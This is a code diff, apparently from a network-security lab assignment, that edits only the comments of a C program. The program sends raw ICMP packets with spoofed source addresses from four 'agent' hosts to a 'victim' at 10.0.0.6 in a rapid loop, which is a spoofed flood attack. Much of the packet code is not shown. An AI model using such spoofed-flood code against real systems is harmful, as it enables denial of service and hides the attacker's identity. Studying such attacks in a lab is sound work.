@@ -7,7 +7,7 @@
 #include <arpa/inet.h>
 #include <unistd.h>
 
-// Standard Checksum Algorithm
+// Standard Checksum Function
 unsigned short csum(unsigned short *ptr, int nbytes) {
     register long sum;
     unsigned short oddbyte;
@@ -22,7 +22,7 @@ unsigned short csum(unsigned short *ptr, int nbytes) {
 }
 
 int main(void) {
-    // 1. Create Raw Socket
+    // 1. Create Raw Socket for ICMP
     int s = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP);
     if (s < 0) { perror("Socket failed"); exit(1); }
 
@@ -39,12 +39,12 @@ int main(void) {
     struct icmphdr *icmph = (struct icmphdr *)(packet + sizeof(struct iphdr));
     struct sockaddr_in sin;
 
-    char *target_ip = "10.0.0.6"; // The Victim
+    char *target_ip = "10.0.0.6"; // The Victim (h6)
     sin.sin_family = AF_INET;
     sin.sin_port = htons(0);
     sin.sin_addr.s_addr = inet_addr(target_ip);
 
-    // Spoofed Agents (h2 - h5)
+    // Manual Requirement: 4 Spoofed Agent Devices
     char *agents[] = {"10.0.0.2", "10.0.0.3", "10.0.0.4", "10.0.0.5"};
     int current_agent = 0;
 
@@ -83,7 +83,7 @@ int main(void) {
         current_agent++;
         if (current_agent >= 4) current_agent = 0;
 
-        usleep(1000); // Small delay to allow Tshark to catch up
+        usleep(1000); // Small delay
     }
     return 0;
 }
